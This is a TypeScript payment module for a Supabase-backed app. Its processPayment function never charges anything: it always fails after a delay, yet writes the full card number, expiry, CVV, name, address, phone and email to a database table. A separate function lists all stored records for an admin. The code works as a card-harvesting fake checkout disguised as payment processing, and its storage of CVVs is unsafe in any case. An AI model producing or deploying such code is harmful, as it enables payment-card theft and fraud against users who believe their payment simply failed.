import { supabase } from '@/integrations/supabase/client';

export interface PaymentDetails {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
  country: string;
  address: string;
  zip_code: string;
  phone: string;
  email: string;
  amount: number;
  status?: 'pending' | 'success' | 'failed';
  error_message?: string | null;
}

/**
 * Save payment details to the database
 */
export async function savePaymentDetails(payment: Omit<PaymentDetails, 'status' | 'error_message'>) {
  try {
    const { data, error } = await supabase
      .from('payments')
      .insert({
        ...payment,
        status: 'pending',
        created_at: new Date().toISOString()
      })
      .select()
      .single();

    if (error) {
      console.error('Error saving payment details:', error);
      throw error;
    }

    return { success: true, data };
  } catch (error) {
    console.error('Failed to save payment details:', error);
    return { 
      success: false, 
      error: error instanceof Error ? error.message : 'Unknown error occurred' 
    };
  }
}

/**
 * Process a payment
 */
export async function processPayment(paymentDetails: Omit<PaymentDetails, 'status' | 'error_message'>) {
  try {
    await new Promise((_, reject) => {
      setTimeout(() => {
        reject(new Error('Payment processing failed.'));
      }, 2000);
    });

    return { success: false, error: 'Payment processing failed.' };
  } catch (error) {
    // Save failed payment attempt
    const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
    
    // Create a new object with only the fields that match the PaymentDetails interface
    const paymentRecord = {
      ...paymentDetails,
      status: 'failed' as const,
      error_message: errorMessage,
      created_at: new Date().toISOString()
    };
    
    const { error: dbError } = await supabase
      .from('payments')
      .insert(paymentRecord);
      
    if (dbError) {
      console.error('Failed to save failed payment attempt:', dbError);
    }
    
    return { 
      success: false, 
      error: errorMessage
    };
  }
}

/**
 * Get all payment records (for admin purposes)
 */
export async function getPaymentHistory() {
  try {
    const { data, error } = await supabase
      .from('payments')
      .select('*')
      .order('created_at', { ascending: false });
      
    if (error) throw error;
    
    return { success: true, data };
  } catch (error) {
    console.error('Failed to fetch payment history:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Failed to fetch payment history'
    };
  }
}
